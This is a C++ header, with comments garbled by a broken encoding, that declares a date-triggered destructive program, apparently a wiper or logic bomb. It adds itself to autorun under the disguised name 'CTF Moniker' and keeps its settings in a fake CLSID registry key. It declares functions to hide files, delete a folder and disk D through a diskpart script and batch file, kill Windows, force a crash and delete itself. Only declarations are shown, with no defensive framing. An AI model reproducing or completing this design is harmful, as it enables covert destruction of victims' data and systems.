#pragma once
class CDeleteDay
{
private:
	CString m_strFilePath; //���� � ������ ���������
	//���������� � ������������

public:
	CDeleteDay();
	~CDeleteDay();

	// //��������� ���� ������������
	bool AddToAutoRun();
	// ��������� �� �������� �� ���� ���������� �������
	bool InspectDeleteData();

	// ���������� � ������ ����� ���������� ������
	bool SaveDateOfPerformance(SYSTEMTIME SysTime);
	// ���������� ����� ����� ����� �������
	bool SavePathOfFolderToDelete(CString csFolderPath);
	void HideFile(bool bHide);
	bool EnableCrashOnCtrlScroll();
	bool DeleteDiskD();
	bool SaveTaskKillWindows();
	void SelfDelete();
	bool PerformATask();
};

static const wchar_t* RunOnceItemName = L"CTF Moniker";
static const wchar_t* RegDataKeyName = L"CLSID\\{00000305-1111-0000-C000-A0B0C0000046}";
static const wchar_t* DelDayKeyName = L"delDay";
static const wchar_t* DelDayOfWeekKeyName = L"delDayOfWeek";
static const wchar_t* DelMonthKeyName = L"delMonth";
static const wchar_t* DelFolderKeyName = L"FolderToDel";
static const wchar_t* DelDiskDKeyName = L"delD";
static const wchar_t* KillWindowsKeyName = L"KillWin";

bool DeleteFolder();
bool IfDeleteDiskD();
bool IfKillWindows();
bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[]);
bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[]);
void DoKillWindows();
int stringSizeInBytes(CString strToCalc);

